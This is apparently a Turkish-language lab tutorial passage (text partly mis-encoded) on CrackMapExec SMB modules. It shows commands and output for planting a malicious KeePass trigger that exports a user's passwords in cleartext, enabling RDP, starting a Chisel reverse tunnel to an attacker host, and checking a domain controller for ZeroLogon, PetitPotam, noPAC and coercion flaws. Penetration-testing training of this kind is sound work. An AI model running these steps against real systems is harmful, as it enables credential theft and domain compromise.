`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M get_netconnections

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
GET_NETC... 10.129.203.121 445 DC01 [+] IP Address:
['172.16.1.10', '172.16.2.50', 'fe80::3cd3:b51c:e8b9:b36f'] Search Domain:
['inlanefreight.htb', '.htb']
GET_NETC... 10.129.203.121 445 DC01 [+] IP Address:
['10.129.203.121'] Search Domain: ['inlanefreight.htb', '.htb']
GET_NETC... 10.129.203.121 445 DC01 [*] Saved raw output
to network-connections-10.129.203.121-2022-11-14_115228.log
```


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M ioxidresolver

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
IOXIDRES... 10.129.203.121 445 DC01 Address: 172.16.1.10
IOXIDRES... 10.129.203.121 445 DC01 Address: 172.16.2.50
IOXIDRES... 10.129.203.121 445 DC01 Address:
10.129.203.121

```


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_discover

SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 Found process
"KeePass" with PID 5004 (user INLANEFREIGHT\julio)
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\AppData\Roaming\KeePass\KeePass.config.xml
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\Application Data\KeePass\KeePass.config.xml
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\Documents\Database.kdbx
KEEPASS_... 10.129.203.121 445 DC01 Found
C:\Users\julio\My Documents\Database.kdbx
```

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=ADD

KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.
xml
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] Adding trigger "export_database" to
"C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.203.121 445 DC01 [+] Malicious trigger
successfully added, you can now wait for KeePass reload and poll the
exported files
```

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=RESTART

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process
```


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=POLL

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] Polling for
database export every 5 seconds, please be patient
KEEPASS_... 10.129.203.121 445 DC01 [*] we need to wait
for the target to enter his master password ! Press CTRL+C to abort and
use clean option to cleanup everything
KEEPASS_... 10.129.203.121 445 DC01 [+] Found database
export !
KEEPASS_... 10.129.203.121 445 DC01 [+] Moved remote
"C:\Users\Public\export.xml" to local "/tmp/export.xml"
```

```
cat /tmp/export.xml | grep -i protectinmemory -A 5
 <Value
ProtectInMemory="True">ForNewDCAnew92Pas#$</Value>
	 </String>
	 <String>
		 <Key>Title</Key>
		 <Value>Administrator</Value>
	 </String>

```


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -o ACTION=CLEAN

KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.
xml
[!] Module is not opsec safe, are you sure you want to run this? [Y/n]
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01 [*] No export found in
C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.203.121 445 DC01 [*] Found trigger
"export_database" in configuration file, removing
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process

```


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M keepass_trigger -
o ACTION=ALL

KEEPASS_CONFIG_PATH=C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.
xml
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] Y
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Adding trigger
"export_database" to
"C:/Users/julio/AppData/Roaming/KeePass/KeePass.config.xml"
KEEPASS_... 10.129.203.121 445 DC01 [+] Malicious trigger
successfully added, you can now wait for KeePass reload and poll the
exported files
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process
KEEPASS_... 10.129.203.121 445 DC01 [*] Polling for
database export every 5 seconds, please be patient
KEEPASS_... 10.129.203.121 445 DC01 [*] we need to wait
for the target to enter his master password ! Press CTRL+C to abort and
use clean option to cleanup everything
...
KEEPASS_... 10.129.203.121 445 DC01 [+] Found database
export !
KEEPASS_... 10.129.203.121 445 DC01 [+] Moved remote
"C:\Users\Public\export.xml" to local "/tmp/export.xml"
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Cleaning
everything..
KEEPASS_... 10.129.203.121 445 DC01 [*] No export found in
C:\Users\Public , everything is cleaned
KEEPASS_... 10.129.203.121 445 DC01 [*] Found trigger
"export_database" in configuration file, removing
KEEPASS_... 10.129.203.121 445 DC01 [*] Restarting
INLANEFREIGHT\julio's KeePass process
KEEPASS_... 10.129.203.121 445 DC01
KEEPASS_... 10.129.203.121 445 DC01 [*] Extracting
password..
KEEPASS_... 10.129.203.121 445 DC01 Notes : None
KEEPASS_... 10.129.203.121 445 DC01 Password :
ForNewDCAnew92Pas#$
KEEPASS_... 10.129.203.121 445 DC01 Title : Administrator
KEEPASS_... 10.129.203.121 445 DC01 URL : None
KEEPASS_... 10.129.203.121 445 DC01 UserName :
Administrator
<SNIP>

```

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

```
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp --options

[*] rdp module options:
		 ACTION Enable/Disable RDP (choices: enable, disable)
crackmapexec smb 10.129.203.121 -u julio -p Password1 -M rdp -o
ACTION=enable
SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 10.129.203.121 445 DC01 [+]
inlanefreight.htb\julio:Password1 (Pwn3d!)
RDP 10.129.203.121 445 DC01 [+] RDP enabled
successfully
```


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

```
crackmapexec smb -L

[*] bh_owned Set pwned computer as owned in Bloodhound
[*] dfscoerce Module to check if the DC is vulnerable to
DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
[*] drop-sc Drop a searchConnector-ms file on each
writable share
[*] empire_exec Uses Empire's RESTful API to generate a
launcher for the specified listener and executes it
[*] enum_avproducts Gathers information on all endpoint
protection solutions installed on the remote host(s) via WMI
[*] enum_dns Uses WMI to dump DNS from an AD DNS Server
[*] get_netconnections Uses WMI to query network connections.
[*] gpp_autologin Searches the domain controller for
registry.xml to find autologon information and returns the username and
password.
[*] gpp_password Retrieves the plaintext password and other
information for accounts pushed through Group Policy Preferences.
[*] handlekatz Get lsass dump using handlekatz64 and parse
the result with pypykatz
[*] hash_spider Dump lsass recursively from a given hash
using BH to find local admins
[*] impersonate List and impersonate tokens to run command
as locally logged on users
[*] install_elevated Checks for AlwaysInstallElevated
[*] ioxidresolver Thie module helps you to identify hosts that
have additional active interfaces
[*] keepass_discover Search for KeePass-related files and
process.
[*] keepass_trigger Set up a malicious KeePass trigger to export
the database in cleartext.
[*] lsassy Dump lsass and parse the result remotely
with lsassy
[*] masky Remotely dump domain user credentials via an
ADCS and a KDC
[*] met_inject Downloads the Meterpreter stager and injects
it into memory
[*] ms17-010 MS17-010, /!\ not tested oustide home lab
[*] nanodump Get lsass dump using nanodump and parse the
result with pypykatz
[*] nopac Check if the DC is vulnerable to CVE-2021-
42278 and CVE-2021-42287 to impersonate DA from standard domain user
[*] ntlmv1 Detect if lmcompatibilitylevel on the target
is set to 0 or 1
[*] petitpotam Module to check if the DC is vulnerable to
PetitPotam, credit to @topotam
[*] procdump Get lsass dump using procdump64 and parse
the result with pypykatz
[*] rdp Enables/Disables RDP
[*] runasppl Check if the registry value RunAsPPL is set
or not
[*] scuffy Creates and dumps an arbitrary .scf file
with the icon property containing a UNC path to the declared SMB server
against all writeable shares
[*] shadowcoerce Module to check if the target is vulnerable
to ShadowCoerce, credit to @Shutdown and @topotam
[*] slinky Creates windows shortcuts with the icon
attribute containing a UNC path to the specified SMB server in all shares
with write permissions
[*] spider_plus List files on the target server (excluding
`DIR` directories and `EXT` extensions) and save them to the `OUTPUT`
directory if they are smaller then `SIZE`
[*] spooler Detect if print spooler is enabled or not
[*] teams_localdb Retrieves the cleartext ssoauthcookie from
the local Microsoft Teams database, if teams is open we kill all Teams
process
[*] test_connection Pings a host
[*] uac Checks UAC status
[*] wdigest Creates/Deletes the 'UseLogonCredential'
registry key enabling WDigest cred dumping on Windows >= 8.1
[*] web_delivery Kicks off a Metasploit Payload using the
exploit/multi/script/web_delivery module
[*] webdav Checks whether the WebClient service is
running on the target
[*] wireless Get key of all wireless interfaces
[*] zerologon Module to check if the DC is vulnerable to
Zerologon aka CVE-2020-1472
```

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

```
crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$' --
put-file ./chisel.exe \\Windows\\Temp\\chisel.exe --local-auth

SMB 10.129.204.146 445 WS01 [*] Windows Server
2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False)
(SMBv1:True)
SMB 10.129.204.146 445 WS01 [+]
WS01\Administrator:IpreferanewP@$ (Pwn3d!)
SMB 10.129.204.146 445 WS01 [*] Copy ./chisel.exe
to \Windows\Temp\chisel.exe
SMB 10.129.204.146 445 WS01 [+] Created file
./chisel.exe on \\C$\\Windows\Temp\chisel.exe
```


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

```
/chisel server --reverse
2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint
CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

```
crackmapexec smb 10.129.204.146 -u Administrator -p 'IpreferanewP@$' -x
"C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks" --local-auth

SMB 10.129.204.146 445 WS01 [*] Windows Server
2016 Standard 14393 x64 (name:WS01) (domain:WS01) (signing:False)
(SMBv1:True)
SMB 10.129.204.146 445 WS01 [+]
WS01\Administrator:IpreferanewP@$ (Pwn3d!)
```


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

```
proxychains4 -q crackmapexec smb 172.16.10.3 -M Zerologon

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
ZEROLOGO... 172.16.10.3 445 DC01 VULNERABLE
ZEROLOGO... 172.16.10.3 445 DC01 Next step:
https://github.com/dirkjanm/CVE-2020-1472

```


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

```
proxychains4 -q crackmapexec smb 172.16.10.3 -M PetitPotam

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
PETITPOT... 172.16.10.3 445 DC01 VULNERABLE
PETITPOT... 172.16.10.3 445 DC01 Next step:
https://github.com/topotam/PetitPotam

```


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M nopac

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
NOPAC 172.16.10.3 445 DC01 TGT with PAC size 1564
NOPAC 172.16.10.3 445 DC01 TGT without PAC size
759
NOPAC 172.16.10.3 445 DC01
NOPAC 172.16.10.3 445 DC01 VULNEABLE
NOPAC 172.16.10.3 445 DC01 Next step:
https://github.com/Ridter/noPac
```



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M dfscoerce

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
DFSCOERC... 172.16.10.3 445 DC01 VULNERABLE
DFSCOERC... 172.16.10.3 445 DC01 Next step:
https://github.com/Wh04m1001/DFSCoerce
```


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

```
proxychains4 -q crackmapexec smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M shadowcoerce

SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
SMB 172.16.10.3 445 DC01 [+]
INLANEFREIGHT.HTB\carole.holmes:Y3t4n0th3rP4ssw0rd
```


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

```
proxychains4 -q crackmapexec --verbose smb 172.16.10.3 -u carole.holmes -p
'Y3t4n0th3rP4ssw0rd' -M shadowcoerce

DEBUG:root:Passed args:
{'aesKey': None,
'amsi_bypass': None,
'clear_obfscripts': False,
'codec': 'utf-8',
'computers': None,
'connectback_host': None,
'content': False,
'continue_on_success': False,
'cred_id': [],
'darrell': False,
'depth': None,
'disks': False,
'domain': None,
'enabled': False,
'exclude_dirs': '',
'exec_method': None,
'execute': None,
'export': None,
'fail_limit': None,
'force_ps32': False,
'gen_relay_list': None,
'get_file': None,
'gfail_limit': None,
'groups': None,
'hash': [],
'jitter': None,
'kdcHost': None,
'kerberos': False,
'laps': None,
'list_modules': False,
'local_auth': False,
'local_groups': None,
'loggedon_users': False,
<SNIP>
'wmi': None,
'wmi_namespace': 'root\\cimv2'}
DEBUG:asyncio:Using selector: EpollSelector
DEBUG Using selector: EpollSelector
DEBUG:root:Running
DEBUG Running
DEBUG:root:Started thread poller
DEBUG Started thread poller
SMB 172.16.10.3 445 DC01 [*] Windows Server
2016 Standard 14393 x64 (name:DC01) (domain:INLANEFREIGHT.HTB)
(signing:True) (SMBv1:True)
DEBUG:root:add_credential(credtype=plaintext, domain=INLANEFREIGHT,
username=carole.holmes, password=Y3t4n0th3rP4ssw0rd, groupid=None,
pillaged_from=None) => None
DEBUG add_credential(credtype=plaintext, domain=INLANEFREIGHT,
